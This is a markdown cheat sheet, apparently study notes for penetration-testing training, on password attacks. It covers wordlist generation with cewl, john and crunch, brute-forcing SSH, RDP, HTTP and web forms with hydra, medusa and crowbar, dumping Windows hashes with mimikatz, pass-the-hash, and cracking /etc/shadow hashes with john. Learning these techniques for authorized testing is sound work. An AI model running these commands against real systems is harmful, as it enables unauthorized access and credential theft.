# Password Attacks

## Wordlists

 Save more time at the expense of low coverage.

Try the most possible passwords.

`/usr/share/wordlists`

 ### Standard Wordlists

To create custom password lists

 ```bash
cewl --help | less
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt		# scrape website, search for words with at least 6 chars and write them to a txt
 ```

Use **John** to create different styles of passwords

```bash
sudo nano /etc/john/john.conf
# find [List.Rules:WordList]
# set some rules, such as adding 2 digits at the end of each password
$[0-9]$[0-9]
john --wordlis=megacorp-cewl.txt --rules --stdout > mutate.txt
```

### Brute Force Wordlists

Test every password combinations.

#### Generate brute force passwords in a certain pattern to save time with 'crunch'

| Placeholder | Character Translation              |
| ----------- | ---------------------------------- |
| @           | Lower case alpha characters        |
| ,           | Uppercase alpha characters         |
| %           | Numeric characters                 |
| ^           | Special characters including space |

```bash
crunch 8 8 -t ,@@^^%%% # generate pwd with min and max length of 8 chars, -t to specify pattern
crunch 4 6 0123456789ABCDEF -o crunch.txt		# use only some characters
# /usr/share/crunch/charset.lst			generate pwd with predefined char sets
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt	# choose char set, and mixalpha for upper/lower letters
```



## Common Network Service Attack Methods

### HTTP htaccess Attack with Medusa

```bash
medusa -h <HOST IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin 
```

### Remote Desktop Protocol Attack with Crowbar

```bash
sudo apt install crowbar
crowbar -b rdp -s <HOST IP> -u admin -C <password file> -n 1	# -b for protocol, -n for number of thread
```

### SSH Attack with THC-Hydra

```bash
# -l 					target username
# -P 					Wordlist
# protocol://IP           protocol and IP address
hydra -l kali -P <pwd file> ssh:<IP>
```

### HTTP POST Attack with THC-Hydra

```bash
hydra http-form-post -U | less		# provide more arguments for a form
# look at web page source code first for understanding how a form looks like

hydra <IP> http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P <pwd file> -vV -f
# -f for: stop after first success
```



## Leveraging Password Hashes

### Retrieving Password Hashes

```bash
hashid "<hash>"				# analyze hash
```

Use mimikatz to retrieve pwd hashes from windows

```powershell
# Within mimikatz
privilege::debug
token::elevate		# elevate from high integrity to system integrity
lsadump::sam		# dump hashes
```

### Passing the Hash in Windows

Use hash to authenticate instead of clear text password. Since Windows doesn't use salt with hashes, the hashes are static. So if 2 machines has the same username and password, you could use the hash of one machine to login to the other.

```bash
pth-winexe -U <USERNAME>%<HASH> //<IP> cmd
```

### Password Cracking

Process of recovering the clear text of a password given its hashed form.

```bash
# windows hashes
john hash.txt --format=NT
john --wordlist=<word list> hash.txt --format=NT
john --rules --wordlist=<word list> hash.txt --format=NT

# linux cracking
grep <username> /etc/passwd > pwd-file.txt
sudo grep <username> /etc/shadow > shadow-file.txt
unshadow pwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=<rockyou.txt> unshadowed.txt
# --fork to multithread on older versions, default in new versions
# --node distribute load on multiple computers
```

John is limited by CPU speed.
